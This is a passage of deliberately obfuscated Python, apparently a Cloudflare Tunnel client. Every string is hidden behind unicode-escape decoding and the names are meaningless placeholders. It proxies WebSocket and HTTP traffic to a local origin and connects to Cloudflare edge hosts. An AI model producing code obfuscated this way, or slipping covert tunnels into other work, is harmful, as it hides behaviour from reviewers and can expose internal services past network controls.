        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')) is not None:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].feed(O0_var_974, bool(O0_var_973 & 1))
            return
        request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].extend(O0_var_974)
        if O0_var_973 & 1:
            request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')] = True
            self.request_finished(O0_var_972, request)

class WebSocketProxy:

    def __init__(self, O0_var_975, O0_var_976, request, O0_var_977, logger):
        self.connection = O0_var_975
        self.stream_id = O0_var_976
        self.request = request
        self.origin = O0_var_977
        self.log = logger
        self.incoming = queue.Queue()
        self.stopped = threading.Event()
        self.sock = None

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def feed(self, O0_var_978, O0_var_979=False):
        if O0_var_978:
            self.incoming.put(O0_var_978)
        if O0_var_979:
            self.incoming.put(None)

    def run(self):
        O0_var_980 = None
        try:
            self.sock = O0_fn_26(self.origin)
            self.send_handshake()
            response = http.client.HTTPResponse(self.sock, method=codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'))
            response.begin()
            O0_var_981 = response.getheaders()
            O0_var_982 = []
            O0_var_983 = []
            for O0_var_984, O0_var_985 in O0_var_981:
                O0_var_986 = O0_var_984.lower()
                if O0_var_986 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_983.append((O0_var_986, O0_var_985))
                if not (O0_var_986.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_986.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_986.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_986.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_986 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_982.append((O0_var_986, O0_var_985))
            O0_var_987 = O0_fn_25(O0_var_982)
            O0_var_988 = 200 if response.status == 101 else response.status
            O0_var_989 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_988))]
            O0_var_989.extend(O0_var_983)
            O0_var_989.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_987))
            O0_var_989.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.connection.send_headers(self.stream_id, O0_var_989)
            O0_var_980 = threading.Thread(target=self.write_to_origin, daemon=True)
            O0_var_980.start()
            while not self.stopped.is_set():
                O0_var_990 = self.sock.recv(65536)
                if not O0_var_990:
                    break
                self.connection.send_data(self.stream_id, O0_var_990, False)
            self.connection.send_data(self.stream_id, b'', True)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), self.stream_id, exc)
            try:
                self.connection.send_headers(self.stream_id, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass
        finally:
            self.stopped.set()
            self.incoming.put(None)
            if self.sock is not None:
                try:
                    self.sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    self.sock.close()
                except OSError:
                    pass

    def send_handshake(self):
        O0_var_991 = urlsplit(self.origin)
        O0_var_992 = self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')] if self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')].startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')]
        O0_var_993 = [codecs.decode('\\u0047\\u0045\\u0054\\u0020\\u0025\\u0073\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0031\\u002e\\u0031', 'unicode_escape') % O0_var_992]
        O0_var_994 = False
        O0_var_995 = False
        O0_var_996 = False
        for O0_var_997, O0_var_998 in self.request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
            O0_var_999 = O0_var_997.lower()
            if O0_var_999 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')}:
                continue
            if O0_var_999 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u006b\\u0065\\u0079', 'unicode_escape'):
                O0_var_994 = True
            elif O0_var_999 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'):
                O0_var_995 = True
            elif O0_var_999 == codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'):
                O0_var_996 = True
            O0_var_993.append(codecs.decode('\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_997, O0_var_998))
        O0_var_1000 = O0_var_991.netloc
        O0_var_993.append(codecs.decode('\\u0048\\u006f\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1000)
        if not O0_var_996 and self.request.get(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')):
            O0_var_993.append(codecs.decode('\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u003a\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0025\\u0073', 'unicode_escape') % self.request[codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')])
        if not O0_var_994:
            O0_var_993.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % base64.b64encode(secrets.token_bytes(16)).decode())
        if not O0_var_995:
            O0_var_993.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u003a\\u0020\\u0031\\u0033', 'unicode_escape'))
        O0_var_993.append(codecs.decode('\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'))
        O0_var_993.append(codecs.decode('\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u003a\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'))
        self.sock.sendall((codecs.decode('\\u000d\\u000a', 'unicode_escape').join(O0_var_993) + codecs.decode('\\u000d\\u000a\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0069\\u0073\\u006f\\u002d\\u0038\\u0038\\u0035\\u0039\\u002d\\u0031', 'unicode_escape')))

    def write_to_origin(self):
        while not self.stopped.is_set():
            O0_var_1001 = self.incoming.get()
            if O0_var_1001 is None:
                return
            try:
                self.sock.sendall(O0_var_1001)
            except OSError:
                self.stopped.set()
                return

class ControlStream:

    def __init__(self, O0_var_1002, O0_var_1003, logger):
        self.connection = O0_var_1002
        self.stream_id = O0_var_1003
        self.log = logger
        self.buffer = b''
        self.finished = False

    def start(self, O0_var_1004, O0_var_1005, O0_var_1006, O0_var_1007):
        self.connection.send_data(self.stream_id, O0_fn_12(0), False)
        self.connection.send_data(self.stream_id, O0_fn_13(1, 0, O0_var_1004, O0_var_1005, O0_var_1006, O0_var_1007), False)

    def feed(self, O0_var_1008):
        self.buffer += O0_var_1008
        O0_var_1009, self.buffer = O0_fn_14(self.buffer)
        for O0_var_1010 in O0_var_1009:
            try:
                O0_var_1011 = O0_fn_17(O0_var_1010)
                if O0_var_1011.get(codecs.decode('\\u0062\\u006f\\u006f\\u0074\\u0073\\u0074\\u0072\\u0061\\u0070', 'unicode_escape')):
                    continue
                if O0_var_1011[codecs.decode('\\u006f\\u006b', 'unicode_escape')]:
                    self.log.info(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0065\\u0064\\u0020\\u0061\\u0074\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1011.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')))
                    self.connection.registered = True
                else:
                    self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1011.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))
                    self.connection.registration_failed = True
                    self.connection.stopped = True
            except Exception as exc:
                self.log.debug(codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0020\\u0052\\u0050\\u0043\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

def O0_fn_25(headers):
    O0_var_1012 = []
    for O0_var_1013, O0_var_1014 in headers:
        O0_var_1015 = base64.b64encode(O0_var_1013.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_1016 = base64.b64encode(O0_var_1014.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_1012.append(O0_var_1015 + codecs.decode('\\u003a', 'unicode_escape') + O0_var_1016)
    return codecs.decode('\\u003b', 'unicode_escape').join(O0_var_1012)

def O0_fn_26(O0_var_1017):
    O0_var_1018 = urlsplit(O0_var_1017)
    if O0_var_1018.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_1018.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_1019 = O0_var_1018.port or (443 if O0_var_1018.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_1020 = socket.create_connection((O0_var_1018.hostname, O0_var_1019), timeout=30)
    if O0_var_1018.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_1021 = ssl.create_default_context()
        O0_var_1020 = O0_var_1021.wrap_socket(O0_var_1020, server_hostname=O0_var_1018.hostname)
    O0_var_1020.settimeout(None)
    return O0_var_1020

def O0_fn_27(O0_var_1022, method, O0_var_1023, O0_var_1024, body):
    O0_var_1025 = urlsplit(O0_var_1022)
    if O0_var_1025.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_1025.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_1026 = O0_var_1025.port or (443 if O0_var_1025.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_1027 = http.client.HTTPConnection(O0_var_1025.hostname, O0_var_1026, timeout=30)
    if O0_var_1025.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_1027 = http.client.HTTPSConnection(O0_var_1025.hostname, O0_var_1026, timeout=30)
    O0_var_1028 = {}
    for O0_var_1029, O0_var_1030 in O0_var_1024:
        O0_var_1031 = O0_var_1029.lower()
        if O0_var_1031 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')}:
            continue
        O0_var_1028[O0_var_1029] = O0_var_1030
    O0_var_1028[codecs.decode('\\u0048\\u006f\\u0073\\u0074', 'unicode_escape')] = O0_var_1025.netloc
    if body:
        O0_var_1028[codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u004c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(body))
    O0_var_1032 = O0_var_1023 if O0_var_1023.startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + O0_var_1023
    O0_var_1027.request(method, O0_var_1032, body=body or None, headers=O0_var_1028)
    response = O0_var_1027.getresponse()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): response.status, codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): response.getheaders(), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): response}

def O0_fn_28(O0_var_1033, O0_var_1034):
    O0_var_1035 = []
    O0_var_1036 = O0_var_1034
    while O0_var_1036:
        O0_var_1037 = O0_var_1033.recv(O0_var_1036)
        if not O0_var_1037:
            raise EOFError(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape'))
        O0_var_1035.append(O0_var_1037)
        O0_var_1036 -= len(O0_var_1037)
    return b''.join(O0_var_1035)

def _edge_san_covers_h2(O0_var_1038):
    for O0_var_1039 in O0_var_1038:
        O0_var_1039 = str(O0_var_1039).lower()
        if O0_var_1039 in {codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')}:
            return True
        if O0_var_1039.startswith(codecs.decode('\\u002a\\u002e', 'unicode_escape')) and codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape').endswith(O0_var_1039[1:]):
            return True
    return False

def O0_fn_29(O0_var_1040):
    O0_var_1041 = O0_var_1040.getpeercert(binary_form=True)
    if not O0_var_1041:
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u006e\\u006f\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'))
    from cryptography import x509
    O0_var_1042 = x509.load_der_x509_certificate(O0_var_1041)

    def _attr(name, O0_var_1043):
        O0_var_1044 = name.get_attributes_for_oid(O0_var_1043)
        return O0_var_1044[0].value if O0_var_1044 else None
    O0_var_1045 = _attr(O0_var_1042.issuer, x509.oid.NameOID.ORGANIZATION_NAME)
    O0_var_1046 = _attr(O0_var_1042.issuer, x509.oid.NameOID.ORGANIZATIONAL_UNIT_NAME)
    O0_var_1047 = _attr(O0_var_1042.subject, x509.oid.NameOID.COMMON_NAME)
    if O0_var_1045 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u002c\\u0020\\u0049\\u006e\\u0063\\u002e', 'unicode_escape'):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1045)
    if not str(O0_var_1046 or codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0053\\u0053\\u004c', 'unicode_escape')):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0055\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1046)
    if O0_var_1047 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0043\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0073\\u0075\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0043\\u004e\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1047)
    try:
        O0_var_1048 = O0_var_1042.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
        O0_var_1049 = O0_var_1048.get_values_for_type(x509.DNSName)
    except x509.ExtensionNotFound:
        O0_var_1049 = []
    if not _edge_san_covers_h2(O0_var_1049):
        raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0053\\u0041\\u004e\\u0020\\u0064\\u006f\\u0065\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0063\\u006f\\u0076\\u0065\\u0072\\u0020\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))

def O0_fn_30(verify_certificate, logger):
    O0_var_1050 = list(EDGE_HOSTS)
    secrets.SystemRandom().shuffle(O0_var_1050)
    O0_var_1051 = None
    for O0_var_1052 in O0_var_1050:
        O0_var_1053 = None
        O0_var_1054 = None
        try:
            O0_var_1053 = socket.create_connection((O0_var_1052, EDGE_PORT), timeout=10)
            O0_var_1055 = ssl._create_unverified_context()
            O0_var_1055.set_alpn_protocols([codecs.decode('\\u0068\\u0032', 'unicode_escape')])
            O0_var_1054 = O0_var_1055.wrap_socket(O0_var_1053, server_hostname=codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
            if verify_certificate:
                O0_fn_29(O0_var_1054)
            if O0_var_1054.selected_alpn_protocol() not in {None, codecs.decode('\\u0068\\u0032', 'unicode_escape')}:
                raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u006e\\u0065\\u0067\\u006f\\u0074\\u0069\\u0061\\u0074\\u0065\\u0020\\u0068\\u0032', 'unicode_escape'))
            O0_var_1054.settimeout(ARGO_IDLE_TIMEOUT if ARGO_IDLE_TIMEOUT > 0 else None)
            logger.info(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064', 'unicode_escape'), O0_var_1052, EDGE_PORT)
            return O0_var_1054
        except (OSError, ssl.SSLError) as exc:
            O0_var_1051 = exc
            if O0_var_1054 is not None:
                O0_var_1054.close()
            elif O0_var_1053 is not None:
                O0_var_1053.close()
            logger.warning(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1052, exc)
    raise OSError(codecs.decode('\\u0061\\u006c\\u006c\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0020\\u0065\\u0064\\u0067\\u0065\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1051)
QUIC_DATA_STREAM_SIGNATURE = bytes.fromhex(codecs.decode('\\u0030\\u0061\\u0033\\u0036\\u0063\\u0064\\u0031\\u0032\\u0061\\u0031\\u0033\\u0065', 'unicode_escape'))
QUIC_RPC_STREAM_SIGNATURE = bytes.fromhex(codecs.decode('\\u0035\\u0032\\u0062\\u0062\\u0038\\u0032\\u0035\\u0063\\u0064\\u0062\\u0036\\u0035', 'unicode_escape'))
QUIC_DATA_STREAM_PREAMBLE = QUIC_DATA_STREAM_SIGNATURE + b'01'
QUIC_RPC_STREAM_PREAMBLE = QUIC_RPC_STREAM_SIGNATURE + b'01'
QUIC_CONNECTION_TYPE = {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): 1, codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): 2}
QUIC_META_METHOD = codecs.decode('\\u0048\\u0074\\u0074\\u0070\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')
QUIC_META_HOST = codecs.decode('\\u0048\\u0074\\u0074\\u0070\\u0048\\u006f\\u0073\\u0074', 'unicode_escape')
QUIC_META_STATUS = codecs.decode('\\u0048\\u0074\\u0074\\u0070\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')
QUIC_META_HEADER = codecs.decode('\\u0048\\u0074\\u0074\\u0070\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072', 'unicode_escape')
QUIC_VERSION = 1
QUIC_ALPN = codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')
QUIC_SERVER_NAME = codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')
QUIC_INITIAL_SALT = bytes.fromhex(codecs.decode('\\u0033\\u0038\\u0037\\u0036\\u0032\\u0063\\u0066\\u0037\\u0066\\u0035\\u0035\\u0039\\u0033\\u0034\\u0062\\u0033\\u0034\\u0064\\u0031\\u0037\\u0039\\u0061\\u0065\\u0036\\u0061\\u0034\\u0063\\u0038\\u0030\\u0063\\u0061\\u0064\\u0063\\u0063\\u0062\\u0062\\u0037\\u0066\\u0030\\u0061', 'unicode_escape'))
